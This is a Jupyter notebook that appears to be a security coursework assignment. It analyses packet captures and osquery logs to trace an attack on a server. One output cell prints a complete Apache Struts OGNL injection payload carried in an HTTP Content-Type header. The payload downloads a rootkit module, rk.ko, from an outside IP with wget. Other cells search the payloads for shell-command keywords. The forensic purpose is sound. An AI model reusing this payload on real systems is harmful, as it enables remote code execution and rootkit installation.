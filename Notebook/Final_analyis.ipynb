{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>MP3 - Application of Data Analysis & Factor Graphs in HPC Security"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR: Invalid requirement: '#Installing'\n"
     ]
    }
   ],
   "source": [
    "!pip install pyshark #Installing pyshark"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#!pip install seaborn  #installing other necessary packages\n",
    "import seaborn as sns\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#installing other necessary packages for file conversion and manipulation\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "import pyshark\n",
    "from IPython.display import Image\n",
    "import json \n",
    "from pandas.io.json import json_normalize\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import os\n",
    "os.chdir(\"D:\\CS 498\\mp3\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "OSI Images from https://en.wikipedia.org/wiki/OSI_model"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Import the pcap files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "http = pyshark.FileCapture('http.pcap', keep_packets=True)\n",
    "http2 = pyshark.FileCapture('http2.pcap', keep_packets=True)\n",
    "dns = pyshark.FileCapture('dns.pcap', keep_packets=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Layer ETH:\n",
      "\tDestination: 02:42:ac:11:00:02\n",
      "\tAddress: 02:42:ac:11:00:02\n",
      "\t.... ..1. .... .... .... .... = LG bit: Locally administered address (this is NOT the factory default)\n",
      "\t.... ...0 .... .... .... .... = IG bit: Individual address (unicast)\n",
      "\tSource: 02:42:63:79:49:dd\n",
      "\t.... ..1. .... .... .... .... = LG bit: Locally administered address (this is NOT the factory default)\n",
      "\t.... ...0 .... .... .... .... = IG bit: Individual address (unicast)\n",
      "\tType: IPv4 (0x0800)\n",
      "\tAddress: 02:42:63:79:49:dd\n"
     ]
    }
   ],
   "source": [
    "ETH = 0\n",
    "IP = 1\n",
    "TCP = 2\n",
    "UDP = 2\n",
    "DNS = 3\n",
    "http[2][ETH].pretty_print()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### User defined function creation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "###Function for http and http2\n",
    "def dataparse(data):\n",
    "    ETH = 0\n",
    "    IP = 1\n",
    "    TCP = 2\n",
    "    df_data = []\n",
    "    for pkt in data:\n",
    "        if len(pkt.layers) < 3:\n",
    "            continue\n",
    "        if pkt[2].layer_name != 'tcp':\n",
    "            continue\n",
    "\n",
    "        try:\n",
    "            d = {\n",
    "                \n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                'length' :pkt.length,\n",
    "                'highest_layer': pkt.highest_layer,\n",
    "                'dest_ip': pkt[IP].dst,\n",
    "                'dest_port': pkt[TCP].dstport,\n",
    "                'content_type':pkt.http.content_type,\n",
    "                'request_uri':pkt.http.request_uri\n",
    "                \n",
    "                }\n",
    "        except:\n",
    "            d = {\n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                'length' :pkt.length,\n",
    "                'highest_layer': pkt.highest_layer,\n",
    "                'dest_ip': pkt[IP].dst,\n",
    "                'dest_port': pkt[TCP].dstport,\n",
    "                'content_type': 'NA',\n",
    "                'request_uri':'NA'\n",
    "                \n",
    "                }\n",
    "        df_data.append(d)\n",
    "    df = pd.DataFrame(df_data)\n",
    "    return df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def dnsdata(data):\n",
    "    df_data = []\n",
    "    for pkt in data:\n",
    "    #     if len(pkt.layers) < 3:\n",
    "    #         continue\n",
    "    #     if pkt[2].layer_name != 'tcp':\n",
    "    #         continue\n",
    "        try:   \n",
    "            d = {\n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                'length' :pkt.length,\n",
    "               'dest_ip': pkt[IP].dst,\n",
    "                'dest_port': pkt[TCP].dstport,\n",
    "                'm':pkt[IP].dst_host,\n",
    "                'src_host': pkt[IP].src_host,\n",
    "                'y': pkt[IP].src,\n",
    "               'Source_port': pkt[UDP].srcport\n",
    "\n",
    "            }\n",
    "        except:\n",
    "             d = {\n",
    "                'timestamp': pkt.sniff_time.timestamp(),\n",
    "                 'length' :pkt.length,\n",
    "                'dest_ip': pkt[IP].dst,\n",
    "                'dest_port': 'NA',\n",
    "                 'm':pkt[IP].dst_host,\n",
    "                'src_host': pkt[IP].src_host,\n",
    "                'y': pkt[IP].src, \n",
    "                'Source_port': 'NA'\n",
    "            }\n",
    "\n",
    "        df_data.append(d)\n",
    "        df = pd.DataFrame(df_data)\n",
    "    return df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "http_df=dataparse(http)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "http2_df=dataparse(http2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "dns_df=dnsdata(data=dns)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "OS Query files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "oslogs=[]\n",
    "with open('osqueryd.results.log','r') as f:\n",
    "    while True:\n",
    "        content=f.readline()\n",
    "        if not content:\n",
    "            break\n",
    "        try:\n",
    "            oslogs.append(json.loads(content))\n",
    "        except:\n",
    "            print('Bad Json')\n",
    "oslogs_query=pd.json_normalize(oslogs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>0d4f52b9dacac07cf2316d1686cc707c</td>\n",
       "      <td>0644</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>cffc9b8ead76006419975c0d22ba49d5fdf001a0</td>\n",
       "      <td>43d11069f7682e63289f38d184e4193f7486502f099250...</td>\n",
       "      <td>4096</td>\n",
       "      <td>/etc/osquery/.osquery.conf.swp</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                   name hostIdentifier                  calendarTime  \\\n",
       "0           system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC   \n",
       "1  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "2  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "3  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "4  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "\n",
       "     unixTime epoch counter action                 decorations.host_uuid  \\\n",
       "0  1517877185     0   38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "1  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "3  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "4  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "  decorations.username columns.name  ...                       columns.md5  \\\n",
       "0                 root           rk  ...                               NaN   \n",
       "1                 root          NaN  ...  0d4f52b9dacac07cf2316d1686cc707c   \n",
       "2                 root          NaN  ...                                     \n",
       "3                 root          NaN  ...                                     \n",
       "4                 root          NaN  ...                                     \n",
       "\n",
       "  columns.mode columns.mtime                              columns.sha1  \\\n",
       "0          NaN           NaN                                       NaN   \n",
       "1         0644    1517877228  cffc9b8ead76006419975c0d22ba49d5fdf001a0   \n",
       "2                                                                        \n",
       "3                                                                        \n",
       "4                                                                        \n",
       "\n",
       "                                      columns.sha256 columns.size  \\\n",
       "0                                                NaN          NaN   \n",
       "1  43d11069f7682e63289f38d184e4193f7486502f099250...         4096   \n",
       "2                                                                   \n",
       "3                                                                   \n",
       "4                                                                   \n",
       "\n",
       "              columns.target_path columns.time columns.transaction_id  \\\n",
       "0                             NaN          NaN                    NaN   \n",
       "1  /etc/osquery/.osquery.conf.swp   1517877228                      0   \n",
       "2  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "3  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "4  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "\n",
       "  columns.uid  \n",
       "0         NaN  \n",
       "1           0  \n",
       "2              \n",
       "3              \n",
       "4              \n",
       "\n",
       "[5 rows x 27 columns]"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslogs_query.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "###Exporting all to csv\n",
    "http_df.to_csv(\"http_df.csv\")\n",
    "http2_df.to_csv(\"http2_df.csv\")\n",
    "dns_df.to_csv(\"dns_df.csv\")\n",
    "oslogs_query.to_csv(\"osquery.csv\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Checking which file is the attacker and legitimate one <b>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def attacker(df):\n",
    "    \"\"\"\n",
    "    Summary:\n",
    "    \n",
    "    This function will check whether a pcap file is of the attacker or is legitimate\n",
    "    \n",
    "    Parameters: \n",
    "    df : dataframe of the pcap file to check\n",
    "\n",
    "    Returns: \n",
    "    A string describing the status of the file\n",
    "    \"\"\"\n",
    "    flag='NA'\n",
    "    for num in df['content_type'].unique():\n",
    "        if '#cmd' in num:\n",
    "            flag=True\n",
    "        else:\n",
    "            flag=False\n",
    "    if flag==True:\n",
    "        print('This file belongs to an attacker')\n",
    "    else:\n",
    "        print('This is a legitimate file')   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This file belongs to an attacker\n"
     ]
    }
   ],
   "source": [
    "attacker(http_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "This is a legitimate file\n"
     ]
    }
   ],
   "source": [
    "attacker(http2_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.1a,b,c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "timestamp                                              1.52139e+09\n",
       "length                                                         358\n",
       "highest_layer                                                 HTTP\n",
       "dest_ip                                                 172.17.0.2\n",
       "dest_port                                                     8080\n",
       "content_type     .multipart/form-data~${#context[\"com.opensymph...\n",
       "request_uri                                       /showcase.action\n",
       "Name: 403, dtype: object"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "http_df[http_df['request_uri']=='/showcase.action'].sort_values(by='timestamp',ascending=True).iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 1.2a "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>content_type</th>\n",
       "      <th>occurence</th>\n",
       "      <th>content_type_length</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>3</td>\n",
       "      <td>818</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>1</td>\n",
       "      <td>806</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>2</td>\n",
       "      <td>845</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>%{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...</td>\n",
       "      <td>1</td>\n",
       "      <td>810</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>.multipart/form-data~${#context[\"com.opensymph...</td>\n",
       "      <td>3</td>\n",
       "      <td>144</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>application/x-www-form-urlencoded</td>\n",
       "      <td>4</td>\n",
       "      <td>33</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        content_type  occurence  \\\n",
       "0  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...          3   \n",
       "1  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...          1   \n",
       "2  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...          2   \n",
       "3  %{(#_='multipart/form-data').(#dm=@ognl.OgnlCo...          1   \n",
       "4  .multipart/form-data~${#context[\"com.opensymph...          3   \n",
       "6                  application/x-www-form-urlencoded          4   \n",
       "\n",
       "   content_type_length  \n",
       "0                  818  \n",
       "1                  806  \n",
       "2                  845  \n",
       "3                  810  \n",
       "4                  144  \n",
       "6                   33  "
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "content_type=http_df.groupby(['content_type'])['length'].count().to_frame().reset_index()\n",
    "content_type.rename(columns={'length':'occurence'},inplace=True)\n",
    "content_type['content_type_length'] = content_type['content_type'].apply(len)\n",
    "content_type[content_type['content_type']!='NA']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.2b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "whoami is present\n",
      "wget is present\n",
      "ls is present\n",
      "cat is present\n",
      "cd is not present\n",
      "insmod is present\n",
      "ssh is not present\n",
      "lsmod is not present\n"
     ]
    }
   ],
   "source": [
    "for words in ['whoami','wget','ls','cat','cd','insmod','ssh','lsmod']:\n",
    "    x=content_type['content_type'].str.contains(words).sum()\n",
    "    if x>0:\n",
    "        print(\"{} is present\".format(words))\n",
    "    else:\n",
    "        print(\"{} is not present\".format(words))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Wget is a command-line utility for downloading files from the web.<br>\n",
    "The ls command is a command-line utility for listing the contents of a directory or directories given to it via standard input<br>\n",
    "cat command allows us to create single or multiple files, view contain of file, concatenate files and redirect output in terminal or files<br>\n",
    "Insmod is a trivial program used to insert module to the linux kernel in any location"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.3a.1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "kernel_module=oslogs_query[oslogs_query['name']=='kernel_module']['columns.name'].unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.3a.2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\""
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "http_df[http_df['content_type'].str.contains(\".ko\",)]['content_type'].iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>The attacker-controlled kernel module is rk.ko"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b> Task 1.3a.3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td></td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2882</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Mon Mar 19 15:58:54 2018 UTC</td>\n",
       "      <td>1521475134</td>\n",
       "      <td>0</td>\n",
       "      <td>100</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>3 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "               name hostIdentifier                  calendarTime    unixTime  \\\n",
       "0       system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC  1517877185   \n",
       "42    kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "2882  kernel_module         ubuntu  Mon Mar 19 15:58:54 2018 UTC  1521475134   \n",
       "\n",
       "     epoch counter action                 decorations.host_uuid  \\\n",
       "0        0   38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "42       0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2882     0     100  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "     decorations.username columns.name  ... columns.md5 columns.mode  \\\n",
       "0                    root           rk  ...         NaN          NaN   \n",
       "42                                  rk  ...         NaN          NaN   \n",
       "2882                 root           rk  ...         NaN          NaN   \n",
       "\n",
       "     columns.mtime columns.sha1 columns.sha256 columns.size  \\\n",
       "0              NaN          NaN            NaN          NaN   \n",
       "42             NaN          NaN            NaN          NaN   \n",
       "2882           NaN          NaN            NaN          NaN   \n",
       "\n",
       "     columns.target_path columns.time columns.transaction_id columns.uid  \n",
       "0                    NaN          NaN                    NaN         NaN  \n",
       "42                   NaN          NaN                    NaN         NaN  \n",
       "2882                 NaN          NaN                    NaN         NaN  \n",
       "\n",
       "[3 rows x 27 columns]"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "oslogs_query[(oslogs_query['columns.name']=='rk') & (oslogs_query['action']=='added')]\n",
    "###It shows that the kernel module ko is loaded into the vulnerable server"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<b>Task 1.3b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['/etc/dbus-1/system.d/org.freedesktop.hostname1.conf.dpkg-new',\n",
       "       '/root/.ssh/known_hosts', '/root/.ssh/.known_hosts.swp',\n",
       "       '/root/.ssh/.known_hosts.swpx', '/root/.ssh/known_hosts~'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
